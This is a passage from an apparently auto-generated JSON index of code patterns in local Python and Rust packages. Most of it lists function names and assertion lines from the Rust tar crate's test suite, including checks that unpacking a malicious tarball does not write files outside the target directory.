    "name": "cobyqa",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv_diarization/venv_diarization/lib/python3.11/site-packages/scipy/_lib/cobyqa",
    "name": "cobyqa",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv/lib/python3.11/site-packages/numpy/fft",
    "name": "fft",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv/lib/python3.11/site-packages/numpy/matrixlib",
    "name": "matrixlib",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv_verify/lib/python3.11/site-packages/scipy/_lib/cobyqa",
    "name": "cobyqa",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44",
    "name": "tar-0.4.44",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/tests/all.rs",
        "function_defs": [
          "fn simple_concat() {",
          "fn decode_names<R>(ar: &mut Archive<R>) -> Vec<String>",
          "fn header_impls() {",
          "fn header_impls_missing_last_header() {",
          "fn reading_files() {",
          "fn writing_files() {",
          "fn large_filename() {",
          "fn large_filename_with_dot_dot_at_100_byte_mark() {",
          "fn reading_entries_common<R: Read>(mut entries: Entries<R>) {",
          "fn reading_entries() {",
          "fn reading_entries_with_seek() {",
          "fn new(reader: R) -> LoggingReader<R> {",
          "fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {",
          "fn seek(&mut self, pos: io::SeekFrom) -> io::Result<u64> {",
          "fn skipping_entries_with_seek() {",
          "fn check_dirtree(td: &TempDir) {",
          "fn extracting_directories() {",
          "fn extracting_duplicate_file_fail() {",
          "fn extracting_duplicate_file_succeed() {",
          "fn extracting_duplicate_link_fail() {",
          "fn extracting_duplicate_link_succeed() {",
          "fn xattrs() {",
          "fn no_xattrs() {",
          "fn writing_and_extracting_directories() {",
          "fn writing_and_extracting_directories_complex_permissions() {",
          "fn writing_directories_recursively() {",
          "fn append_dir_all_blank_dest() {",
          "fn append_dir_all_does_not_work_on_non_directory() {",
          "fn extracting_duplicate_dirs() {",
          "fn unpack_old_style_bsd_dir() {",
          "fn handling_incorrect_file_size() {",
          "fn extracting_malicious_tarball() {",
          "fn octal_spaces() {",
          "fn extracting_malformed_tar_null_blocks() {",
          "fn empty_filename() {",
          "fn file_times() {",
          "fn zero_file_times() {",
          "fn backslash_treated_well() {",
          "fn set_mask() {",
          "fn nul_bytes_in_path() {",
          "fn links() {",
          "fn unpack_links() {",
          "fn pax_size() {",
          "fn pax_simple() {",
          "fn pax_simple_write() {",
          "fn pax_path() {",
          "fn pax_linkpath() {",
          "fn long_name_trailing_nul() {",
          "fn long_linkname_trailing_nul() {",
          "fn long_linkname_gnu() {",
          "fn linkname_literal() {",
          "fn append_writer() {",
          "fn encoded_long_name_has_trailing_nul() {",
          "fn reading_sparse() {",
          "fn extract_sparse() {",
          "fn large_sparse() {",
          "fn sparse_with_trailing() {",
          "fn writing_sparse() {",
          "fn path_separators() {",
          "fn append_path_symlink() {",
          "fn name_with_slash_doesnt_fool_long_link_and_bsd_compat() {",
          "fn insert_local_file_different_name() {",
          "fn tar_directory_containing_symlink_to_directory() {",
          "fn long_path() {",
          "fn unpack_path_larger_than_windows_max_path() {",
          "fn append_long_multibyte() {",
          "fn read_only_directory_containing_files() {",
          "fn tar_directory_containing_special_files() {",
          "fn header_size_overflow() {",
          "fn ownership_preserving() {",
          "fn pax_and_gnu_uid_gid() {"
        ],
        "struct_defs": [
          "struct LoggingReader<R> {"
        ],
        "impl_blocks": [],
        "uses": [
          "use std::fs::{self, File};",
          "use std::io::prelude::*;",
          "use std::io::{self, BufWriter, Cursor};",
          "use std::iter::repeat;",
          "use std::path::{Path, PathBuf};",
          "use filetime::FileTime;",
          "use tar::{Archive, Builder, Entries, Entry, EntryType, Header, HeaderMode};",
          "use tempfile::{Builder as TempBuilder, TempDir};",
          "use ::std::os::unix::fs::PermissionsExt;",
          "use std::ffi::OsStr;",
          "use std::os::unix::prelude::*;",
          "use std::borrow::Cow;",
          "use std::env;",
          "use std::os::unix::fs::symlink;",
          "use std::os::unix::fs::symlink;",
          "use std::env;",
          "use std::ffi::CString;",
          "use std::os::unix::prelude::*;"
        ],
        "macros": [
          "Err(e) => panic!(\"{} returned {}\", stringify!($e), e),",
          "&include_bytes!(concat!(\"archives/\", $e))[..]",
          "let bytes = tar!(\"simple.tar\");",
          "assert_eq!(expected, actual);",
          "assert_eq!(expected, actual);",
          "for entry in t!(ar.entries()) {",
          "let e = t!(entry);",
          "names.push(t!(::std::str::from_utf8(&e.path_bytes())).to_string());",
          "let mut ar = Archive::new(Cursor::new(tar!(\"simple.tar\")));",
          "for file in t!(ar.entries()) {",
          "let file = t!(file);",
          "assert!(h1b[..] == h2b[..] && h2b[..] != hnb[..])",
          "let mut ar = Archive::new(Cursor::new(tar!(\"simple_missing_last_header.tar\")));",
          "for file in t!(ar.entries()) {",
          "let file = t!(file);",
          "assert!(h1b[..] == h2b[..] && h2b[..] != hnb[..])",
          "let rdr = Cursor::new(tar!(\"reading_files.tar\"));",
          "let mut entries = t!(ar.entries());",
          "let mut a = t!(entries.next().unwrap());",
          "assert_eq!(&*a.header().path_bytes(), b\"a\");",
          "t!(a.read_to_string(&mut s));",
          "assert_eq!(s, \"a\\na\\na\\na\\na\\na\\na\\na\\na\\na\\na\\n\");",
          "let mut b = t!(entries.next().unwrap());",
          "assert_eq!(&*b.header().path_bytes(), b\"b\");",
          "t!(b.read_to_string(&mut s));",
          "assert_eq!(s, \"b\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\n\");",
          "assert!(entries.next().is_none());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(t!(File::create(&path)).write_all(b\"test\"));",
          "t!(ar.append_file(\"test2\", &mut t!(File::open(&path))));",
          "let data = t!(ar.into_inner());",
          "let mut entries = t!(ar.entries());",
          "let mut f = t!(entries.next().unwrap());",
          "assert_eq!(&*f.header().path_bytes(), b\"test2\");",
          "assert_eq!(f.header().size().unwrap(), 4);",
          "t!(f.read_to_string(&mut s));",
          "assert_eq!(s, \"test\");",
          "assert!(entries.next().is_none());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(t!(File::create(&path)).write_all(b\"test\"));",
          "header.set_metadata(&t!(fs::metadata(&path)));",
          "t!(ar.append(&header, &b\"test\"[..]));",
          "t!(ar.append_file(&too_long, &mut t!(File::open(&path))));",
          "t!(ar.append_data(&mut header, &too_long, &b\"test\"[..]));",
          "let rd = Cursor::new(t!(ar.into_inner()));",
          "let mut entries = t!(ar.entries());",
          "assert_eq!(&*f.header().path_bytes(), filename.as_bytes());",
          "assert_eq!(f.header().size().unwrap(), 4);",
          "t!(f.read_to_string(&mut s));",
          "assert_eq!(s, \"test\");",
          "assert_eq!(&*f.path_bytes(), too_long.as_bytes());",
          "assert_eq!(f.header().size().unwrap(), 4);",
          "t!(f.read_to_string(&mut s));",
          "assert_eq!(s, \"test\");",
          "assert!(f.header().path_bytes().len() < too_long.len());",
          "assert_eq!(&*f.path_bytes(), too_long.as_bytes());",
          "assert_eq!(f.header().size().unwrap(), 4);",
          "t!(f.read_to_string(&mut s));",
          "assert_eq!(s, \"test\");",
          "assert!(entries.next().is_none());",
          "t!(ar.append_data(&mut header, &long_name_with_dot_dot, b\"test\".as_slice()));",
          "let rd = Cursor::new(t!(ar.into_inner()));",
          "let mut entries = t!(ar.entries());",
          "assert_eq!(&*f.path_bytes(), long_name_with_dot_dot.as_bytes());",
          "assert_eq!(f.header().size().unwrap(), 4);",
          "t!(f.read_to_string(&mut s));",
          "assert_eq!(s, \"test\");",
          "assert!(entries.next().is_none());",
          "let mut a = t!(entries.next().unwrap());",
          "assert_eq!(&*a.header().path_bytes(), b\"a\");",
          "t!(a.read_to_string(&mut s));",
          "assert_eq!(s, \"a\\na\\na\\na\\na\\na\\na\\na\\na\\na\\na\\n\");",
          "t!(a.read_to_string(&mut s));",
          "assert_eq!(s, \"\");",
          "let mut b = t!(entries.next().unwrap());",
          "assert_eq!(&*b.header().path_bytes(), b\"b\");",
          "t!(b.read_to_string(&mut s));",
          "assert_eq!(s, \"b\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\n\");",
          "assert!(entries.next().is_none());",
          "let rdr = Cursor::new(tar!(\"reading_files.tar\"));",
          "reading_entries_common(t!(ar.entries()));",
          "let rdr = Cursor::new(tar!(\"reading_files.tar\"));",
          "let mut reader = LoggingReader::new(Cursor::new(tar!(\"reading_files.tar\")));",
          "let files: Vec<_> = t!(ar_reader.entries())",
          "let mut seekable_reader = LoggingReader::new(Cursor::new(tar!(\"reading_files.tar",
          "let files_seekable: Vec<_> = t!(ar_seekable_reader.entries_with_seek())",
          "assert!(files == files_seekable);",
          "assert!(seekable_reader.read_bytes < reader.read_bytes);",
          "assert!(fs::metadata(&dir_a).map(|m| m.is_dir()).unwrap_or(false));",
          "assert!(fs::metadata(&dir_b).map(|m| m.is_dir()).unwrap_or(false));",
          "assert!(fs::metadata(&file_c).map(|m| m.is_file()).unwrap_or(false));",
          "let rdr = Cursor::new(tar!(\"directory.tar\"));",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(File::create(path_present));",
          "let rdr = Cursor::new(tar!(\"reading_files.tar\"));",
          "panic!(\"unexpected error: {:?}\", err);",
          "panic!(",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(File::create(path_present));",
          "let rdr = Cursor::new(tar!(\"reading_files.tar\"));",
          "t!(ar.unpack(td.path()));",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(std::os::unix::fs::symlink(\"file\", path_present));",
          "let rdr = Cursor::new(tar!(\"link.tar\"));",
          "panic!(\"unexpected error: {:?}\", err);",
          "panic!(",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(std::os::unix::fs::symlink(\"file\", path_present));",
          "let rdr = Cursor::new(tar!(\"link.tar\"));",
          "t!(ar.unpack(td.path()));",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir_in(\"/var/tmp\"));",
          "let rdr = Cursor::new(tar!(\"xattrs.tar\"));",
          "t!(ar.unpack(td.path()));",
          "assert_eq!(val.unwrap(), \"epm\".as_bytes());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir_in(\"/var/tmp\"));",
          "let rdr = Cursor::new(tar!(\"xattrs.tar\"));",
          "t!(ar.unpack(td.path()));",
          "assert_eq!(",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(t!(File::create(&tmppath)).write_all(b\"c\"));",
          "t!(ar.append_dir(\"a\", \".\"));",
          "t!(ar.append_dir(\"a/b\", \".\"));",
          "t!(ar.append_file(\"a/c\", &mut t!(File::open(&tmppath))));",
          "t!(ar.finish());",
          "let rdr = Cursor::new(t!(ar.into_inner()));",
          "t!(ar.unpack(td.path()));",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(t!(File::create(&tmppath)).write_all(b\"c\"));",
          "t!(header.set_path(\"a\"));",
          "t!(ar.append(&header, data));",
          "t!(header.set_path(\"a/b\"));",
          "t!(ar.append(&header, data));",
          "t!(ar.append_file(\"a/c\", &mut t!(File::open(&tmppath))));",
          "t!(ar.finish());",
          "let rdr = Cursor::new(t!(ar.into_inner()));",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(fs::create_dir(&base_dir));",
          "t!(t!(File::create(base_dir.join(\"file1\"))).write_all(b\"file1\"));",
          "t!(fs::create_dir(&sub_dir));",
          "t!(t!(File::create(sub_dir.join(\"file2\"))).write_all(b\"file2\"));",
          "t!(ar.append_dir_all(\"foobar\", base_dir));",
          "let data = t!(ar.into_inner());",
          "t!(ar.unpack(td.path()));",
          "assert!(fs::metadata(&base_dir).map(|m| m.is_dir()).unwrap_or(false));",
          "assert!(fs::metadata(&file1_path)",
          "assert!(fs::metadata(&sub_dir).map(|m| m.is_dir()).unwrap_or(false));",
          "assert!(fs::metadata(&file2_path)",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(fs::create_dir(&base_dir));",
          "t!(t!(File::create(base_dir.join(\"file1\"))).write_all(b\"file1\"));",
          "t!(fs::create_dir(&sub_dir));",
          "t!(t!(File::create(sub_dir.join(\"file2\"))).write_all(b\"file2\"));",
          "t!(ar.append_dir_all(\"\", base_dir));",
          "let data = t!(ar.into_inner());",
          "t!(ar.unpack(td.path()));",
          "assert!(fs::metadata(&base_dir).map(|m| m.is_dir()).unwrap_or(false));",
          "assert!(fs::metadata(&file1_path)",
          "assert!(fs::metadata(&sub_dir).map(|m| m.is_dir()).unwrap_or(false));",
          "assert!(fs::metadata(&file2_path)",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(t!(File::create(&path)).write_all(b\"test\"));",
          "assert!(result.is_err());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "let rdr = Cursor::new(tar!(\"duplicate_dirs.tar\"));",
          "t!(ar.unpack(td.path()));",
          "assert!(fs::metadata(&some_dir).map(|m| m.is_dir()).unwrap_or(false));",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(header.set_path(\"testdir/\"));",
          "t!(ar.append(&header, &mut io::empty()));",
          "let rdr = Cursor::new(t!(ar.into_inner()));",
          "t!(ar.unpack(td.path()));",
          "assert!(t!(ar.entries()).all(|fr| fr.is_ok()));",
          "assert!(td.path().join(\"testdir\").is_dir());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(File::create(&path));",
          "let mut file = t!(File::open(&path));",
          "t!(header.set_path(\"somepath\"));",
          "header.set_metadata(&t!(file.metadata()));",
          "t!(ar.append(&header, &mut file));",
          "let rdr = Cursor::new(t!(ar.into_inner()));",
          "assert!(ar.unpack(td.path()).is_err());",
          "assert!(t!(ar.entries()).any(|fr| fr.is_err()));",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "assert!(header.set_path(path).is_err(), \"was ok: {:?}\", path);",
          "t!(a.append(&header, io::repeat(1).take(1)));",
          "t!(ar.unpack(td.path()));",
          "assert!(fs::metadata(\"/tmp/abs_evil.txt\").is_err());",
          "assert!(fs::metadata(\"/tmp/abs_evil.txt2\").is_err());",
          "assert!(fs::metadata(\"/tmp/abs_evil.txt3\").is_err());",
          "assert!(fs::metadata(\"/tmp/abs_evil.txt4\").is_err());",
          "assert!(fs::metadata(\"/tmp/abs_evil.txt5\").is_err());",
          "assert!(fs::metadata(\"/tmp/abs_evil.txt6\").is_err());",
          "assert!(fs::metadata(\"/tmp/rel_evil.txt\").is_err());",
          "assert!(fs::metadata(\"/tmp/rel_evil.txt\").is_err());",
          "assert!(fs::metadata(td.path().join(\"../tmp/rel_evil.txt\")).is_err());",
          "assert!(fs::metadata(td.path().join(\"../rel_evil2.txt\")).is_err());",
          "assert!(fs::metadata(td.path().join(\"../rel_evil3.txt\")).is_err());",
          "assert!(fs::metadata(td.path().join(\"../rel_evil4.txt\")).is_err());",
          "assert!(fs::metadata(td.path().join(\"some\")).is_err());",
          "assert!(fs::metadata(td.path().join(\"tmp\"))",
          "assert!(fs::metadata(td.path().join(\"tmp/abs_evil.txt\"))",
          "assert!(fs::metadata(td.path().join(\"tmp/abs_evil2.txt\"))",
          "assert!(fs::metadata(td.path().join(\"tmp/abs_evil3.txt\"))",
          "assert!(fs::metadata(td.path().join(\"tmp/abs_evil4.txt\"))",
          "assert!(fs::metadata(td.path().join(\"tmp/abs_evil5.txt\"))",
          "assert!(fs::metadata(td.path().join(\"tmp/abs_evil6.txt\"))",
          "let rdr = Cursor::new(tar!(\"spaces.tar\"));",
          "assert_eq!(entry.header().mode().unwrap() & 0o777, 0o777);",
          "assert_eq!(entry.header().uid().unwrap(), 0);",
          "assert_eq!(entry.header().gid().unwrap(), 0);",
          "assert_eq!(entry.header().size().unwrap(), 2);",
          "assert_eq!(entry.header().mtime().unwrap(), 0o12440016664);",
          "assert_eq!(entry.header().cksum().unwrap(), 0o4253);",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(File::create(&path1));",
          "t!(File::create(&path2));",
          "t!(ar.append_file(\"tmpfile1\", &mut t!(File::open(&path1))));",
          "let mut data = t!(ar.into_inner());",
          "t!(ar.append_file(\"tmpfile2\", &mut t!(File::open(&path2))));",
          "t!(ar.finish());",
          "let data = t!(ar.into_inner());",
          "assert!(ar.unpack(td.path()).is_ok());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "let rdr = Cursor::new(tar!(\"empty_filename.tar\"));",
          "assert!(ar.unpack(td.path()).is_ok());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "let rdr = Cursor::new(tar!(\"file_times.tar\"));",
          "t!(ar.unpack(td.path()));",
          "assert_eq!(mtime.unix_seconds(), 1000000000);",
          "assert_eq!(mtime.nanoseconds(), 0);",
          "assert_eq!(atime.unix_seconds(), 1000000000);",
          "assert_eq!(atime.nanoseconds(), 0);",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(File::create(&path));",
          "t!(ar.append_path_with_name(&path, \"a\"));",
          "let data = t!(ar.into_inner());",
          "assert!(ar.unpack(td.path()).is_ok());",
          "assert!(mtime.unix_seconds() != 0);",
          "assert!(atime.unix_seconds() != 0);",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(ar.append_dir(\"foo\\\\bar\", td.path()));",
          "let mut ar = Archive::new(Cursor::new(t!(ar.into_inner())));",
          "let f = t!(t!(ar.entries()).next().unwrap());",
          "if cfg!(unix) {",
          "assert_eq!(t!(f.header().path()).to_str(), Some(\"foo\\\\bar\"));",
          "assert_eq!(t!(f.header().path()).to_str(), Some(\"foo/bar\"));",
          "header.set_metadata(&t!(fs::metadata(td.path())));",
          "t!(ar.append(&header, &mut io::empty()));",
          "let data = t!(ar.into_inner());",
          "let f = t!(t!(ar.entries()).next().unwrap());",
          "assert_eq!(t!(f.header().path()).to_str(), Some(\"foo\\\\bar\"));",
          "t!(ar.unpack(td.path()));",
          "assert!(fs::metadata(td.path().join(\"foo\\\\bar\")).is_ok());",
          "t!(header.set_path(\"foo\"));",
          "t!(ar.append(&header, &[][..]));",
          "t!(header.set_path(\"bar\"));",
          "t!(ar.append(&header, &[][..]));",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "let bytes = t!(ar.into_inner());",
          "t!(ar.unpack(td.path()));",
          "let md = t!(fs::metadata(td.path().join(\"foo\")));",
          "assert_eq!(md.permissions().mode(), 0o100566);",
          "let md = t!(fs::metadata(td.path().join(\"bar\")));",
          "assert_eq!(md.permissions().mode(), 0o100420);",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "assert!(err.to_string().contains(\"contains a nul byte\"));",
          "let mut ar = Archive::new(Cursor::new(tar!(\"link.tar\")));",
          "let mut entries = t!(ar.entries());",
          "let link = t!(entries.next().unwrap());",
          "assert_eq!(",
          "t!(link.header().link_name()).as_ref().map(|p| &**p),",
          "let other = t!(entries.next().unwrap());",
          "assert!(t!(other.header().link_name()).is_none());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "let mut ar = Archive::new(Cursor::new(tar!(\"link.tar\")));",
          "t!(ar.unpack(td.path()));",
          "let md = t!(fs::symlink_metadata(td.path().join(\"lnk\")));",
          "assert!(md.file_type().is_symlink());",
          "assert_eq!(mtime.unix_seconds(), 1448291033);",
          "assert_eq!(",
          "&*t!(fs::read_link(td.path().join(\"lnk\"))),",
          "t!(File::open(td.path().join(\"lnk\")));",
          "let mut ar = Archive::new(tar!(\"pax_size.tar\"));",
          "let mut entries = t!(ar.entries());",
          "let mut entry = t!(entries.next().unwrap());",
          "let mut attributes = t!(entry.pax_extensions()).unwrap();",
          "let _first = t!(attributes.next().unwrap());",
          "let _second = t!(attributes.next().unwrap());",
          "let _third = t!(attributes.next().unwrap());",
          "let fourth = t!(attributes.next().unwrap());",
          "assert!(attributes.next().is_none());",
          "assert_eq!(fourth.key(), Ok(\"size\"));",
          "assert_eq!(fourth.value(), Ok(\"4\"));",
          "assert_eq!(entry.header().size().unwrap(), 0);",
          "assert_eq!(entry.size(), 4);",
          "let mut ar = Archive::new(tar!(\"pax.tar\"));",
          "let mut entries = t!(ar.entries());",
          "let mut first = t!(entries.next().unwrap());",
          "let mut attributes = t!(first.pax_extensions()).unwrap();",
          "let first = t!(attributes.next().unwrap());",
          "let second = t!(attributes.next().unwrap());",
          "let third = t!(attributes.next().unwrap());",
          "assert!(attributes.next().is_none());",
          "assert_eq!(first.key(), Ok(\"mtime\"));",
          "assert_eq!(first.value(), Ok(\"1453146164.953123768\"));",
          "assert_eq!(second.key(), Ok(\"atime\"));",
          "assert_eq!(second.value(), Ok(\"1453251915.24892486\"));",
          "assert_eq!(third.key(), Ok(\"ctime\"));",
          "assert_eq!(third.value(), Ok(\"1453146164.953123768\"));",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "let file: File = t!(File::create(&pax_path));",
          "t!(ar.append_pax_extensions(pax_extensions));",
          "t!(ar.append_file(\"test2\", &mut t!(File::open(&pax_path))));",
          "t!(ar.finish());",
          "let mut archive_opened = Archive::new(t!(File::open(pax_path)));",
          "let mut entries = t!(archive_opened.entries());",
          "let mut f: Entry<File> = t!(entries.next().unwrap());",
          "let pax_headers = t!(f.pax_extensions());",
          "assert!(pax_headers.is_some(), \"pax_headers is None\");",
          "let pax_arbitrary = t!(pax_headers.next().unwrap());",
          "assert_eq!(pax_arbitrary.key(), Ok(\"arbitrary_pax_key\"));",
          "assert_eq!(pax_arbitrary.value(), Ok(\"arbitrary_pax_value\"));",
          "let xattr = t!(pax_headers.next().unwrap());",
          "assert_eq!(xattr.key().unwrap(), pax_extensions[1].0);",
          "assert_eq!(xattr.value_bytes(), pax_extensions[1].1);",
          "assert!(entries.next().is_none());",
          "let mut ar = Archive::new(tar!(\"pax2.tar\"));",
          "let mut entries = t!(ar.entries());",
          "let first = t!(entries.next().unwrap());",
          "assert!(first.path().unwrap().ends_with(\"aaaaaaaaaaaaaaa\"));",
          "let mut ar = Archive::new(tar!(\"pax2.tar\"));",
          "let mut links = t!(ar.entries()).skip(3).take(2);",
          "let long_symlink = t!(links.next().unwrap());",
          "assert!(link_name.to_str().unwrap().len() > 99);",
          "assert!(link_name.ends_with(\"bbbbbbbbbbbbbbb\"));",
          "let long_hardlink = t!(links.next().unwrap());",
          "assert!(link_name.to_str().unwrap().len() > 99);",
          "assert!(link_name.ends_with(\"ccccccccccccccc\"));",
          "t!(h.set_path(\"././@LongLink\"));",
          "t!(b.append(&h, \"foo\\0\".as_bytes()));",
          "t!(h.set_path(\"bar\"));",
          "t!(b.append(&h, \"foobar\".as_bytes()));",
          "let contents = t!(b.into_inner());",
          "let e = t!(t!(a.entries()).next().unwrap());",
          "assert_eq!(&*e.path_bytes(), b\"foo\");",
          "t!(h.set_path(\"././@LongLink\"));",
          "t!(b.append(&h, \"foo\\0\".as_bytes()));",
          "t!(h.set_path(\"bar\"));",
          "t!(b.append(&h, \"foobar\".as_bytes()));",
          "let contents = t!(b.into_inner());",
          "let e = t!(t!(a.entries()).next().unwrap());",
          "assert_eq!(&*e.link_name_bytes().unwrap(), b\"foo\");",
          "t!(b.append_link(&mut h, path, target));",
          "let contents = t!(b.into_inner());",
          "let e = &t!(t!(a.entries()).next().unwrap());",
          "assert_eq!(e.header().entry_type(), t);",
          "assert_eq!(e.path().unwrap().to_str().unwrap(), path);",
          "assert_eq!(e.link_name().unwrap().unwrap().to_str().unwrap(), target);",
          "t!(b.append_data(&mut h, path, std::io::empty()));",
          "let contents = t!(b.into_inner());",
          "let e = &t!(t!(a.entries()).next().unwrap());",
          "assert_eq!(e.header().entry_type(), t);",
          "assert_eq!(e.path().unwrap().to_str().unwrap(), path);",
          "assert_eq!(e.link_name().unwrap().unwrap().to_str().unwrap(), target);",
          "let mut writer = t!(b.append_writer(&mut h, \"file1\"));",
          "t!(writer.write_all(b\"foo\"));",
          "t!(writer.write_all(b\"barbaz\"));",
          "t!(writer.finish());",
          "let mut writer = t!(b.append_writer(&mut h, &long_path));",
          "t!(writer.write_all(&long_data));",
          "t!(writer.finish());",
          "let contents = t!(b.into_inner()).into_inner();",
          "let mut entries = t!(ar.entries());",
          "let e = &mut t!(entries.next().unwrap());",
          "assert_eq!(e.header().uid().unwrap(), 42);",
          "assert_eq!(&*e.path_bytes(), b\"file1\");",
          "t!(e.read_to_end(&mut r));",
          "assert_eq!(&r[..], b\"foobarbaz\");",
          "let e = &mut t!(entries.next().unwrap());",
          "assert_eq!(e.header().uid().unwrap(), 43);",
          "assert_eq!(t!(e.path()), long_path.as_path());",
          "t!(e.read_to_end(&mut r));",
          "assert_eq!(r.len(), 513);",
          "assert!(r.iter().all(|b| *b == b'x'));",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(t!(File::create(&path)).write_all(b\"test\"));",
          "t!(b.append_file(&long, &mut t!(File::open(&path))));",
          "let contents = t!(b.into_inner());",
          "let mut e = t!(t!(a.entries()).raw(true).next().unwrap());",
          "t!(e.read_to_end(&mut name));",
          "assert_eq!(name[name.len() - 1], 0);",
          "assert!(header_name.starts_with(b\"././@LongLink\\x00\"));",
          "let rdr = Cursor::new(tar!(\"sparse.tar\"));",
          "let mut entries = t!(ar.entries());",
          "let mut a = t!(entries.next().unwrap());",
          "assert_eq!(&*a.header().path_bytes(), b\"sparse_begin.txt\");",
          "t!(a.read_to_string(&mut s));",
          "assert_eq!(&s[..5], \"test\\n\");",
          "assert!(s[5..].chars().all(|x| x == '\\u{0}'));",
          "let mut a = t!(entries.next().unwrap());",
          "assert_eq!(&*a.header().path_bytes(), b\"sparse_end.txt\");",
          "t!(a.read_to_string(&mut s));",
          "assert!(s[..s.len() - 9].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[s.len() - 9..], \"test_end\\n\");",
          "let mut a = t!(entries.next().unwrap());",
          "assert_eq!(&*a.header().path_bytes(), b\"sparse_ext.txt\");",
          "t!(a.read_to_string(&mut s));",
          "assert!(s[..0x1000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x1000..0x1000 + 5], \"text\\n\");",
          "assert!(s[0x1000 + 5..0x3000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x3000..0x3000 + 5], \"text\\n\");",
          "assert!(s[0x3000 + 5..0x5000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x5000..0x5000 + 5], \"text\\n\");",
          "assert!(s[0x5000 + 5..0x7000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x7000..0x7000 + 5], \"text\\n\");",
          "assert!(s[0x7000 + 5..0x9000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x9000..0x9000 + 5], \"text\\n\");",
          "assert!(s[0x9000 + 5..0xb000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0xb000..0xb000 + 5], \"text\\n\");",
          "let mut a = t!(entries.next().unwrap());",
          "assert_eq!(&*a.header().path_bytes(), b\"sparse.txt\");",
          "t!(a.read_to_string(&mut s));",
          "assert!(s[..0x1000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x1000..0x1000 + 6], \"hello\\n\");",
          "assert!(s[0x1000 + 6..0x2fa0].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x2fa0..0x2fa0 + 6], \"world\\n\");",
          "assert!(s[0x2fa0 + 6..0x4000].chars().all(|x| x == '\\u{0}'));",
          "assert!(entries.next().is_none());",
          "let rdr = Cursor::new(tar!(\"sparse.tar\"));",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(ar.unpack(td.path()));",
          "t!(t!(File::open(td.path().join(\"sparse_begin.txt\"))).read_to_string(&mut s));",
          "assert_eq!(&s[..5], \"test\\n\");",
          "assert!(s[5..].chars().all(|x| x == '\\u{0}'));",
          "t!(t!(File::open(td.path().join(\"sparse_end.txt\"))).read_to_string(&mut s));",
          "assert!(s[..s.len() - 9].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[s.len() - 9..], \"test_end\\n\");",
          "t!(t!(File::open(td.path().join(\"sparse_ext.txt\"))).read_to_string(&mut s));",
          "assert!(s[..0x1000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x1000..0x1000 + 5], \"text\\n\");",
          "assert!(s[0x1000 + 5..0x3000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x3000..0x3000 + 5], \"text\\n\");",
